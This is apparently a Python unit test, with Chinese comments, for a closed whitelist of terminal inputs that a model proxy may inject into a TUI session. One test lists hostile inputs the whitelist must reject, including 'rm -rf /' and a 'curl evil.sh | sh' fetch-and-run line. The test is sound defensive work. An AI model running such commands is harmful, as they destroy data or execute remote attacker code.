"""终端注入白名单契约。

2026-11-06：白名单只放行 PAYLOAD（"继续\r"），导致被 TUI 占 writer 的会话
只能等死 —— daemon 压不了，唯一通道又被挡死。需要放行固定安全指令，
但绝不能允许任意文本（防注入）。
"""
from __future__ import annotations

import unittest

from model_fallback_proxy.foreground_channels import ALLOWED_INPUT_PAYLOADS
from model_fallback_proxy.waveterm_foreground import PAYLOAD


class AllowedPayloadsTest(unittest.TestCase):
    def test_continue_is_allowed(self) -> None:
        self.assertIn(PAYLOAD, ALLOWED_INPUT_PAYLOADS)

    def test_compact_is_allowed(self) -> None:
        self.assertIn("/compact\r", ALLOWED_INPUT_PAYLOADS)
        self.assertIn("/compact", ALLOWED_INPUT_PAYLOADS)

    def test_arbitrary_text_is_rejected(self) -> None:
        """白名单必须封闭：任意命令不能混进来。"""
        for bad in ("rm -rf /\r", "curl evil.sh | sh\r", "echo pwned\r", ""):
            with self.subTest(bad=bad):
                self.assertNotIn(bad, ALLOWED_INPUT_PAYLOADS)

    def test_whitelist_is_small(self) -> None:
        """白名单只应有少量固定项，扩张需人工评审。"""
        self.assertLessEqual(len(ALLOWED_INPUT_PAYLOADS), 6)


if __name__ == "__main__":
    unittest.main()
